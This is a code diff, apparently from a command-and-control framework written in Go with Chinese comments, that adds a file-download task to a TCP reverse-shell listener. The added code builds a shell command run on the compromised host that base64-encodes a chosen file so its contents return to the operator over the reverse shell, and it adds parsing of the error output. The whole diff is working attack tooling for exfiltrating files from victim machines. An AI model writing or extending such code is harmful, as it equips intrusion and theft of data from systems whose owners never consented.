@@ -298,6 +298,12 @@ func (l *TCPReverseListener) runTaskOnConn(c *tcpReverseConn, env TaskEnvelope) 
 		return
 	}
 	cleaned := cleanShellOutput(output, cmd)
+	if TaskType(env.TaskType) == TaskTypeDownload {
+		if errMsg := detectDownloadShellError(cleaned); errMsg != "" {
+			l.reportTaskResult(env.TaskID, startedAt, false, cleaned, errMsg, "", "")
+			return
+		}
+	}
 	l.reportTaskResult(env.TaskID, startedAt, true, cleaned, "", "", "")
 }
 
@@ -316,8 +322,8 @@ func (l *TCPReverseListener) reportTaskResult(taskID string, startedAtMS int64, 
 }
 
 // buildTCPCommand 把 (TaskType + payload) 转成 raw shell 命令字符串。
-// 仅支持 TCP 反弹模式可直接执行的最简任务类型；upload/download/screenshot 这些
-// 需要二进制传输的能力建议使用 http_beacon。
+// 仅支持 TCP 反弹模式可直接执行的最简任务类型；download 通过 base64 输出文本结果，
+// upload/screenshot 等需要二进制传输的能力建议使用 http_beacon。
 func buildTCPCommand(t TaskType, payload map[string]interface{}) (string, bool) {
 	switch t {
 	case TaskTypeExec, TaskTypeShell:
@@ -345,6 +351,16 @@ func buildTCPCommand(t TaskType, payload map[string]interface{}) (string, bool) 
 			return "", false
 		}
 		return "cd " + shellQuote(path) + " && pwd", true
+	case TaskTypeDownload:
+		path, _ := payload["remote_path"].(string)
+		if strings.TrimSpace(path) == "" {
+			return "", false
+		}
+		q := shellQuote(path)
+		return fmt.Sprintf(
+			`f=%s; if [ ! -e "$f" ]; then echo 'C2_DOWNLOAD_ERR: no such file or directory' >&2; exit 1; elif [ -d "$f" ]; then echo 'C2_DOWNLOAD_ERR: is a directory' >&2; exit 1; elif [ ! -r "$f" ]; then echo 'C2_DOWNLOAD_ERR: permission denied' >&2; exit 1; else base64 "$f" 2>/dev/null || base64 < "$f"; fi`,
+			q,
+		), true
 	case TaskTypeExit:
 		return "exit 0", true
 	}
@@ -380,6 +396,29 @@ func readUntilMarker(ctx context.Context, r *bufio.Reader, marker string) (strin
 
 func shellQuote(s string) string {
 	return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
+}
+
+// detectDownloadShellError 识别 download 任务中 shell/base64 返回的错误信息。
+func detectDownloadShellError(output string) string {
+	trimmed := strings.TrimSpace(output)
+	if trimmed == "" {
+		return ""
+	}
+	lower := strings.ToLower(trimmed)
+	markers := []string{
+		"c2_download_err:",
+		"no such file",
+		"permission denied",
+		"is a directory",
+		"cannot open",
+		"not a regular file",
+	}
+	for _, m := range markers {
+		if strings.Contains(lower, m) {
+			return trimmed
+		}
+	}
+	return ""
 }
 
 func isAddrInUse(err error) bool {
